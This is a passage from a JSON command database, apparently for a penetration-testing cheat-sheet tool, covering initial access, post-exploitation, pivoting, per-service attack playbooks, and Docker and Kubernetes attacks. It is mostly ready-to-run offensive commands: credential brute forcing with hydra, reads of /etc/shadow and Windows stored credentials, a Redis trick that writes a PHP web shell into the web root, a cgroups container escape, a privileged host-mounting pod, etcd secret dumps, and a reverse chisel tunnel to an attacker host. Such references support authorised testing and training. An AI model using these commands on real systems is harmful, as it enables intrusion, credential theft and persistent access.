            "desc": "Step 4: Discover virtual hosts and subdomains"
          }
        ]
      },
      {
        "name": "Phase 2 — Initial Access Patterns",
        "commands": [
          {
            "title": "Quick Win: Anonymous FTP",
            "cmd": "ftp <TARGET_IP>  # Login: anonymous / anonymous",
            "tags": [
              "essential"
            ],
            "desc": "Check for anonymous FTP access",
            "note": "Try username: anonymous, password: anonymous or blank"
          },
          {
            "title": "Quick Win: Null SMB Session",
            "cmd": "smbclient -L //<TARGET_IP> -N",
            "tags": [
              "essential"
            ],
            "desc": "Check for null session SMB share listing"
          },
          {
            "title": "Quick Win: NFS Shares",
            "cmds": [
              "showmount -e <TARGET_IP>",
              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Check for exposed NFS shares and mount them"
          },
          {
            "title": "Quick Win: SMTP User Enum",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate valid usernames via SMTP VRFY"
          },
          {
            "title": "Quick Win: Default Credentials",
            "cmds": [
              "# Tomcat: tomcat/tomcat, admin/admin, tomcat/s3cret",
              "# Jenkins: admin/admin, admin/password",
              "# phpMyAdmin: root/(blank), root/root",
              "# WordPress: admin/admin, admin/password"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Try common default credentials for known services",
            "note": "Always check service-specific default creds before brute forcing"
          },
          {
            "title": "Quick Win: Redis Unauthenticated",
            "cmd": "redis-cli -h <TARGET_IP> INFO",
            "tags": [
              "tool"
            ],
            "desc": "Check for unauthenticated Redis access"
          },
          {
            "title": "Quick Win: MongoDB No Auth",
            "cmd": "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'",
            "tags": [
              "tool"
            ],
            "desc": "Check for unauthenticated MongoDB access"
          },
          {
            "title": "Quick Win: SNMP Default Community",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Check for default SNMP community string 'public'"
          },
          {
            "title": "Quick Win: IPMI Hash Dump",
            "cmd": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run; exit'",
            "tags": [
              "tool"
            ],
            "desc": "Dump IPMI hashes (usually crackable)"
          }
        ]
      },
      {
        "name": "Phase 3 — Post-Exploitation Checklist",
        "commands": [
          {
            "title": "Post-Exploit Step 1: Stabilize Shell",
            "cmds": [
              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
              "# Ctrl+Z",
              "stty raw -echo; fg",
              "export TERM=xterm"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Upgrade raw shell to fully interactive TTY"
          },
          {
            "title": "Post-Exploit Step 2: User Context",
            "cmds": [
              "whoami",
              "id",
              "hostname",
              "ip a"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Establish current user context and network position"
          },
          {
            "title": "Post-Exploit Step 3: Sudo Check",
            "cmd": "sudo -l",
            "tags": [
              "essential"
            ],
            "desc": "Check what commands the current user can run as sudo"
          },
          {
            "title": "Post-Exploit Step 4: SUID Binaries",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Find SUID binaries for potential privilege escalation"
          },
          {
            "title": "Post-Exploit Step 5: Cron Jobs",
            "cmds": [
              "cat /etc/crontab",
              "ls -la /etc/cron.d/",
              "ls -la /etc/cron.daily/",
              "crontab -l"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Enumerate scheduled tasks for exploitation"
          },
          {
            "title": "Post-Exploit Step 6: Capabilities",
            "cmd": "getcap -r / 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Find binaries with Linux capabilities set"
          },
          {
            "title": "Post-Exploit Step 7: Kernel Info",
            "cmd": "uname -a && cat /etc/os-release",
            "tags": [
              "essential"
            ],
            "desc": "Check kernel version and OS for kernel exploits"
          },
          {
            "title": "Post-Exploit Step 8: Network Info",
            "cmds": [
              "ip a",
              "ip route",
              "ss -tulpn",
              "cat /etc/hosts",
              "arp -a"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Enumerate network config for pivoting opportunities"
          },
          {
            "title": "Post-Exploit Step 9: Sensitive Files",
            "cmds": [
              "cat /etc/passwd",
              "cat /etc/shadow 2>/dev/null",
              "ls -la /home/",
              "find / -name '*.conf' -o -name '*.config' -o -name '*.bak' 2>/dev/null | head -30"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Search for sensitive files, configs, and backups"
          },
          {
            "title": "Windows Post-Exploit: User Info",
            "cmds": [
              "whoami /all",
              "net user",
              "net localgroup administrators",
              "systeminfo"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Windows equivalent of basic post-exploitation enumeration"
          },
          {
            "title": "Windows Post-Exploit: Stored Creds",
            "cmds": [
              "cmdkey /list",
              "dir C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Credentials\\",
              "reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Search for stored credentials and passwords in Windows"
          }
        ]
      },
      {
        "name": "Phase 4 — Pivoting Workflow",
        "commands": [
          {
            "title": "Pivot Step 1: Discover Interfaces",
            "cmds": [
              "ip a",
              "ip route",
              "arp -a",
              "cat /etc/resolv.conf"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Identify dual-homed interfaces and internal networks"
          },
          {
            "title": "Pivot Step 2: Internal Host Discovery",
            "cmd": "for i in $(seq 1 254); do (ping -c 1 -W 1 <INTERNAL_SUBNET>.$i | grep 'from' &); done; wait",
            "tags": [
              "essential"
            ],
            "desc": "Quick ping sweep of internal subnet from pivot host"
          },
          {
            "title": "Pivot Step 3: Upload Tunnel Tool",
            "cmd": "# Upload chisel/ligolo/socat to the pivot host via existing shell",
            "tags": [
              "essential"
            ],
            "desc": "Transfer tunneling tool to the compromised host"
          },
          {
            "title": "Pivot Step 4: Create SOCKS Proxy",
            "cmds": [
              "# On attacker: chisel server --reverse -p 8080",
              "# On pivot: ./chisel client <ATTACKER_IP>:8080 R:socks"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Establish SOCKS proxy through the pivot for proxychains"
          },
          {
            "title": "Pivot Step 5: Configure Proxychains",
            "cmd": "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf",
            "tags": [
              "essential"
            ],
            "desc": "Add SOCKS proxy to proxychains configuration"
          },
          {
            "title": "Pivot Step 6: Scan Through Proxy",
            "cmd": "proxychains4 nmap -sT -Pn -p 21,22,80,135,139,443,445,3389,5985 <INTERNAL_TARGET> 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Port scan internal targets through the pivot"
          },
          {
            "title": "SSH Dynamic Port Forward",
            "cmd": "ssh -D 1080 -N -f <USER>@<PIVOT_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Create SOCKS proxy via SSH dynamic port forwarding"
          },
          {
            "title": "SSH Local Port Forward",
            "cmd": "ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<REMOTE_PORT> <USER>@<PIVOT_IP> -N",
            "tags": [
              "essential"
            ],
            "desc": "Forward a specific internal service to attacker's localhost"
          },
          {
            "title": "Double Pivot (SSH Chain)",
            "cmd": "ssh -J <USER1>@<PIVOT1_IP> <USER2>@<PIVOT2_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "SSH through multiple hops using ProxyJump"
          }
        ]
      },
      {
        "name": "Phase 5 — Proof & Reporting",
        "commands": [
          {
            "title": "Linux Proof Capture",
            "cmds": [
              "echo '=== PROOF ==='",
              "hostname",
              "whoami",
              "id",
              "ip a",
              "cat /root/proof.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null",
              "date"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Capture proof of compromise on Linux targets"
          },
          {
            "title": "Windows Proof Capture",
            "cmds": [
              "echo === PROOF ===",
              "hostname",
              "whoami",
              "ipconfig",
              "type C:\\Users\\Administrator\\Desktop\\proof.txt 2>nul",
              "date /t && time /t"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Capture proof of compromise on Windows targets"
          },
          {
            "title": "Screenshot with Timestamp (Linux)",
            "cmd": "import -window root screenshot_$(date +%Y%m%d_%H%M%S).png",
            "tags": [
              "tool"
            ],
            "desc": "Take a timestamped desktop screenshot on Linux"
          },
          {
            "title": "Screenshot Current Terminal",
            "cmd": "script -c 'cat /root/proof.txt && id && hostname && ip a' proof_output.txt",
            "tags": [
              "tool"
            ],
            "desc": "Capture terminal output to a file for proof"
          },
          {
            "title": "Archive Engagement Data",
            "cmd": "tar czf engagement_$(date +%Y%m%d).tar.gz scans/ loot/ screenshots/ notes/",
            "tags": [
              "tool"
            ],
            "desc": "Bundle all engagement data for reporting"
          }
        ]
      },
      {
        "name": "Quick Service Checks",
        "commands": [
          {
            "title": "Port 21 — FTP Checks",
            "cmds": [
              "nmap -sV -sC -p 21 <TARGET_IP>",
              "ftp <TARGET_IP>  # try anonymous:anonymous",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "FTP: version scan, anonymous access, brute force"
          },
          {
            "title": "Port 22 — SSH Checks",
            "cmds": [
              "nmap -sV -sC -p 22 <TARGET_IP>",
              "ssh-audit <TARGET_IP>",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SSH: version scan, algorithm audit, brute force"
          },
          {
            "title": "Port 25 — SMTP Checks",
            "cmds": [
              "nmap -sV --script smtp-commands,smtp-enum-users,smtp-vuln* -p 25 <TARGET_IP>",
              "smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SMTP: commands, user enumeration, vulnerability scan"
          },
          {
            "title": "Port 53 — DNS Checks",
            "cmds": [
              "nmap -sV --script dns-nsid -p 53 <TARGET_IP>",
              "dig axfr <DOMAIN> @<TARGET_IP>",
              "dig any <DOMAIN> @<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "DNS: zone transfer, full record enumeration"
          },
          {
            "title": "Port 80/443 — HTTP(S) Checks",
            "cmds": [
              "whatweb http://<TARGET_IP>",
              "nikto -h http://<TARGET_IP>",
              "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt"
            ],
            "tags": [
              "essential"
            ],
            "desc": "HTTP: technology identification, vuln scan, directory brute"
          },
          {
            "title": "Port 110/995 — POP3 Checks",
            "cmds": [
              "nmap -sV --script pop3-capabilities,pop3-ntlm-info -p 110 <TARGET_IP>",
              "# Connect: telnet <TARGET_IP> 110",
              "# USER <USER> / PASS <PASS>"
            ],
            "tags": [
              "tool"
            ],
            "desc": "POP3: capabilities, authentication testing"
          },
          {
            "title": "Port 111 — NFS/RPC Checks",
            "cmds": [
              "nmap -sV --script rpcinfo,nfs* -p 111 <TARGET_IP>",
              "showmount -e <TARGET_IP>",
              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock"
            ],
            "tags": [
              "essential"
            ],
            "desc": "NFS/RPC: share enumeration and mounting"
          },
          {
            "title": "Port 135/139/445 — SMB Checks",
            "cmds": [
              "nmap -sV --script smb-enum-shares,smb-enum-users,smb-vuln* -p 139,445 <TARGET_IP>",
              "smbclient -L //<TARGET_IP> -N",
              "enum4linux-ng -A <TARGET_IP>",
              "crackmapexec smb <TARGET_IP> -u '' -p '' --shares"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SMB: share enum, user enum, vuln scan, null session"
          },
          {
            "title": "Port 161 — SNMP Checks",
            "cmds": [
              "snmpwalk -v2c -c public <TARGET_IP>",
              "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <TARGET_IP>",
              "snmp-check <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "SNMP: community string brute force and enumeration"
          },
          {
            "title": "Port 389/636 — LDAP Checks",
            "cmds": [
              "nmap -sV --script ldap-rootdse,ldap-search -p 389 <TARGET_IP>",
              "ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "LDAP: anonymous bind, base DN enumeration"
          },
          {
            "title": "Port 1433 — MSSQL Checks",
            "cmds": [
              "nmap -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p 1433 <TARGET_IP>",
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
              "crackmapexec mssql <TARGET_IP> -u <USER> -p <PASS> -q 'SELECT @@version'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "MSSQL: info gathering, authentication, query execution"
          },
          {
            "title": "Port 1521 — Oracle Checks",
            "cmds": [
              "nmap -sV --script oracle-sid-brute -p 1521 <TARGET_IP>",
              "odat all -s <TARGET_IP> -p 1521"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Oracle: SID brute force and ODAT enumeration"
          },
          {
            "title": "Port 2049 — NFS Checks",
            "cmds": [
              "showmount -e <TARGET_IP>",
              "nmap -sV --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "NFS: share listing and mount options"
          },
          {
            "title": "Port 3306 — MySQL Checks",
            "cmds": [
              "nmap -sV --script mysql-info,mysql-enum -p 3306 <TARGET_IP>",
              "mysql -h <TARGET_IP> -u root -p",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "MySQL: info, authentication, brute force"
          },
          {
            "title": "Port 3389 — RDP Checks",
            "cmds": [
              "nmap -sV --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <TARGET_IP>",
              "xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "RDP: encryption check, MS12-020 vuln, connection test"
          },
          {
            "title": "Port 5432 — PostgreSQL Checks",
            "cmds": [
              "nmap -sV --script pgsql-brute -p 5432 <TARGET_IP>",
              "psql -h <TARGET_IP> -U postgres -W"
            ],
            "tags": [
              "tool"
            ],
            "desc": "PostgreSQL: brute force and connection test"
          },
          {
            "title": "Port 5900 — VNC Checks",
            "cmds": [
              "nmap -sV --script vnc-info,vnc-brute -p 5900 <TARGET_IP>",
              "vncviewer <TARGET_IP>::5900"
            ],
            "tags": [
              "tool"
            ],
            "desc": "VNC: version info, brute force, connection"
          },
          {
            "title": "Port 5985 — WinRM Checks",
            "cmds": [
              "nmap -sV -p 5985 <TARGET_IP>",
              "crackmapexec winrm <TARGET_IP> -u <USER> -p <PASS>",
              "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "WinRM: authentication testing and shell access"
          },
          {
            "title": "Port 6379 — Redis Checks",
            "cmds": [
              "nmap -sV --script redis-info -p 6379 <TARGET_IP>",
              "redis-cli -h <TARGET_IP> INFO",
              "redis-cli -h <TARGET_IP> CONFIG GET *"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Redis: info gathering, unauthenticated access, config dump"
          },
          {
            "title": "Port 8080/8443 — Web App Checks",
            "cmds": [
              "whatweb http://<TARGET_IP>:8080",
              "gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirb/common.txt",
              "# Check for: Tomcat Manager, Jenkins, Weblogic, JBoss"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Web app servers: technology ID, directory enum, default creds"
          },
          {
            "title": "Port 27017 — MongoDB Checks",
            "cmds": [
              "nmap -sV --script mongodb-info,mongodb-databases -p 27017 <TARGET_IP>",
              "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'"
            ],
            "tags": [
              "tool"
            ],
            "desc": "MongoDB: info gathering and unauthenticated database listing"
          }
        ]
      },
      {
        "name": "Service-Specific Attack Playbooks",
        "commands": [
          {
            "title": "Port 21 FTP",
            "desc": "FTP attack checklist",
            "cmds": [
              "ftp <TARGET_IP>  # anonymous",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
              "nmap --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 <TARGET_IP>",
              "wget -r ftp://anonymous:@<TARGET_IP>/"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 22 SSH",
            "desc": "SSH attack checklist",
            "cmds": [
              "nc -nv <TARGET_IP> 22",
              "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
              "ssh -i id_rsa <USER>@<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 25 SMTP",
            "desc": "SMTP attack checklist",
            "cmds": [
              "nmap --script smtp-commands -p 25 <TARGET_IP>",
              "smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>",
              "nmap --script smtp-open-relay -p 25 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 445 SMB",
            "desc": "SMB attack checklist",
            "cmds": [
              "smbclient -L //<TARGET_IP>/ -N",
              "enum4linux -a <TARGET_IP>",
              "nmap --script smb-vuln* -p 445 <TARGET_IP>",
              "crackmapexec smb <TARGET_IP> -u '' -p '' --shares"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 1433 MSSQL",
            "desc": "MSSQL attack checklist",
            "cmds": [
              "nmap --script ms-sql-info -p 1433 <TARGET_IP>",
              "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP> -windows-auth"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 3306 MySQL",
            "desc": "MySQL attack checklist",
            "cmds": [
              "nmap --script mysql-info -p 3306 <TARGET_IP>",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
              "mysql -h <TARGET_IP> -u root -p"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 5985 WinRM",
            "desc": "WinRM attack checklist",
            "cmds": [
              "crackmapexec winrm <TARGET_IP> -u <USER> -p '<PASS>'",
              "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 6379 Redis",
            "desc": "Redis attack checklist",
            "cmds": [
              "redis-cli -h <TARGET_IP> INFO",
              "redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html/",
              "redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php",
              "redis-cli -h <TARGET_IP> SET x '<?php system($_GET[\"cmd\"]); ?>'",
              "redis-cli -h <TARGET_IP> SAVE"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Port 27017 MongoDB",
            "desc": "MongoDB attack checklist",
            "cmds": [
              "mongosh <TARGET_IP>:27017",
              "show dbs",
              "nmap --script mongodb-databases -p 27017 <TARGET_IP>"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "container-cloud",
    "name": "Container & Infrastructure Testing",
    "icon": "🐳",
    "description": "Test Docker, Kubernetes, and CI/CD pipeline security",
    "subcategories": [
      {
        "name": "Docker Enumeration & Escape",
        "commands": [
          {
            "title": "List Running Containers",
            "cmd": "docker ps",
            "tags": [
              "essential"
            ],
            "desc": "List all running Docker containers"
          },
          {
            "title": "List All Containers",
            "cmd": "docker ps -a",
            "tags": [
              "essential"
            ],
            "desc": "List all containers including stopped ones"
          },
          {
            "title": "List Docker Images",
            "cmd": "docker images",
            "tags": [
              "essential"
            ],
            "desc": "List all locally available Docker images"
          },
          {
            "title": "Inspect Container Config",
            "cmd": "docker inspect <CONTAINER_ID>",
            "tags": [
              "essential"
            ],
            "desc": "View detailed configuration of a container including mounts and env vars"
          },
          {
            "title": "Execute Command in Container",
            "cmd": "docker exec -it <CONTAINER_ID> /bin/bash",
            "tags": [
              "essential"
            ],
            "desc": "Get an interactive shell inside a running container"
          },
          {
            "title": "Check if Inside Container",
            "cmds": [
              "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
              "ls -la /.dockerenv",
              "cat /proc/self/mountinfo | grep -i docker"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Determine if the current shell is inside a Docker container"
          },
          {
            "title": "Docker Socket Exploitation",
            "cmds": [
              "# If /var/run/docker.sock is mounted:",
              "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
              "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Exploit mounted Docker socket to escape container"
          },
          {
            "title": "Privileged Container Escape",
            "cmds": [
              "mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape",
              "echo 1 > /tmp/escape/notify_on_release",
              "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
              "echo \"$host_path/exploit.sh\" > /tmp/escape/release_agent",
              "echo '#!/bin/sh' > /exploit.sh && echo '<COMMAND>' >> /exploit.sh && chmod +x /exploit.sh",
              "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Escape a --privileged container via cgroups release_agent"
          },
          {
            "title": "Mount Host Filesystem",
            "cmd": "docker run -v /:/host -it <IMAGE> chroot /host",
            "tags": [
              "essential"
            ],
            "desc": "Mount the host root filesystem into a new container"
          },
          {
            "title": "nsenter Host Escape",
            "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
            "tags": [
              "advanced"
            ],
            "desc": "Enter the host namespaces from a privileged container"
          },
          {
            "title": "Check Container Capabilities",
            "cmd": "capsh --print",
            "tags": [
              "essential"
            ],
            "desc": "List current container capabilities for escape assessment"
          },
          {
            "title": "Docker API Unauthenticated",
            "cmd": "curl -s http://<TARGET_IP>:2375/containers/json | jq .",
            "tags": [
              "essential"
            ],
            "desc": "Check for exposed Docker API without authentication"
          },
          {
            "title": "Docker Secrets in Environment",
            "cmd": "docker inspect <CONTAINER_ID> --format='{{range .Config.Env}}{{println .}}{{end}}'",
            "tags": [
              "essential"
            ],
            "desc": "Extract environment variables that may contain secrets"
          },
          {
            "title": "Escape via SYS_ADMIN Cap",
            "cmds": [
              "mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp",
              "# If mount succeeds, SYS_ADMIN capability is available for escape"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Test and exploit SYS_ADMIN capability for container escape"
          },
          {
            "title": "Deepce Container Escape Scanner",
            "cmd": "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh && chmod +x deepce.sh && ./deepce.sh",
            "tags": [
              "tool"
            ],
            "desc": "Automated Docker container escape detection tool"
          },
          {
            "title": "Docker API Exploit",
            "desc": "Exploit exposed Docker API",
            "cmds": [
              "curl http://<TARGET_IP>:2375/containers/json",
              "curl http://<TARGET_IP>:2375/images/json"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Docker Registry Enum",
            "desc": "Enumerate registry",
            "cmds": [
              "curl http://<TARGET_IP>:5000/v2/_catalog",
              "curl http://<TARGET_IP>:5000/v2/<REPO>/tags/list"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "nsenter Escape",
            "desc": "Break to host namespace",
            "cmd": "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Kubernetes Reconnaissance",
        "commands": [
          {
            "title": "Get All Pods",
            "cmd": "kubectl get pods --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all pods across all namespaces"
          },
          {
            "title": "Get All Nodes",
            "cmd": "kubectl get nodes -o wide",
            "tags": [
              "essential"
            ],
            "desc": "List all cluster nodes with detailed info"
          },
          {
            "title": "Get Secrets",
            "cmd": "kubectl get secrets --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all secrets in the cluster"
          },
          {
            "title": "Decode Secret",
            "cmd": "kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key): \\(.value | @base64d)\"'",
            "tags": [
              "essential"
            ],
            "desc": "Decode and view a Kubernetes secret's values"
          },
          {
            "title": "Get ConfigMaps",
            "cmd": "kubectl get configmaps --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "List all ConfigMaps that may contain sensitive configuration"
          },
          {
            "title": "View ConfigMap Data",
            "cmd": "kubectl get configmap <NAME> -n <NAMESPACE> -o yaml",
            "tags": [
              "tool"
            ],
            "desc": "View ConfigMap contents including sensitive data"
          },
          {
            "title": "Check Permissions",
            "cmd": "kubectl auth can-i --list",
            "tags": [
              "essential"
            ],
            "desc": "List all permissions for the current service account"
          },
          {
            "title": "Check Cluster Admin",
            "cmd": "kubectl auth can-i '*' '*' --all-namespaces",
            "tags": [
              "essential"
            ],
            "desc": "Check if current identity has cluster-admin privileges"
          },
          {
            "title": "Exec into Pod",
            "cmd": "kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/bash",
            "tags": [
              "essential"
            ],
            "desc": "Get an interactive shell in a running pod"
          },
          {
            "title": "Copy File from Pod",
            "cmd": "kubectl cp <NAMESPACE>/<POD_NAME>:/path/to/file ./local_file",
            "tags": [
              "tool"
            ],
            "desc": "Copy a file from a pod to the local machine"
          },
          {
            "title": "Get Service Accounts",
            "cmd": "kubectl get serviceaccounts --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List all service accounts in the cluster"
          },
          {
            "title": "Get Cluster Role Bindings",
            "cmd": "kubectl get clusterrolebindings -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List cluster role bindings to find privileged accounts"
          },
          {
            "title": "Read Service Account Token",
            "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "tags": [
              "essential"
            ],
            "desc": "Read the mounted service account token from within a pod"
          },
          {
            "title": "Kubernetes API from Pod",
            "cmd": "curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"",
            "tags": [
              "essential"
            ],
            "desc": "Query Kubernetes API using the mounted service account token"
          },
          {
            "title": "Get Pod Security Policies",
            "cmd": "kubectl get psp",
            "tags": [
              "tool"
            ],
            "desc": "List Pod Security Policies to find misconfigurations"
          },
          {
            "title": "Etcd Read Secrets",
            "cmd": "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get / --prefix --keys-only",
            "tags": [
              "advanced"
            ],
            "desc": "Enumerate etcd keys if etcd is accessible"
          },
          {
            "title": "Etcd Dump Kubernetes Secrets",
            "cmd": "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get /registry/secrets --prefix --print-value-only",
            "tags": [
              "advanced"
            ],
            "desc": "Dump all Kubernetes secrets directly from etcd"
          },
          {
            "title": "Create Privileged Pod",
            "cmd": "kubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'",
            "tags": [
              "advanced"
            ],
            "desc": "Create a privileged pod mounting the host filesystem"
          },
          {
            "title": "Get Ingress Rules",
            "cmd": "kubectl get ingress --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List all ingress rules for endpoint discovery"
          },
          {
            "title": "Get Network Policies",
            "cmd": "kubectl get networkpolicies --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List network policies to find unrestricted namespaces"
          },
          {
            "title": "Get Persistent Volumes",
            "cmd": "kubectl get pv,pvc --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List persistent volumes and claims for data access"
          },
          {
            "title": "Get DaemonSets",
            "cmd": "kubectl get daemonsets --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List DaemonSets running on all nodes"
          },
          {
            "title": "Get Pod Environment Variables",
            "cmd": "kubectl exec <POD_NAME> -n <NAMESPACE> -- env | sort",
            "tags": [
              "essential"
            ],
            "desc": "Extract environment variables from a running pod"
          },
          {
            "title": "Get Pod Logs",
            "cmd": "kubectl logs <POD_NAME> -n <NAMESPACE> --all-containers",
            "tags": [
              "tool"
            ],
            "desc": "View pod logs for sensitive information leakage"
          },
          {
            "title": "Kubectl Proxy for API Access",
            "cmd": "kubectl proxy --port=8001 &",
            "tags": [
              "tool"
            ],
            "desc": "Start local proxy to Kubernetes API for easy access"
          },
          {
            "title": "List RBAC Roles",
            "cmd": "kubectl get roles,clusterroles --all-namespaces -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List all RBAC roles to identify overly permissive roles"
          },
          {
            "title": "List RBAC Bindings",
            "cmd": "kubectl get rolebindings,clusterrolebindings --all-namespaces -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List role bindings to find privilege assignments"
          },
          {
            "title": "Kube-Hunter Remote Scan",
            "cmd": "kube-hunter --remote <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster for security issues remotely"
          },
          {
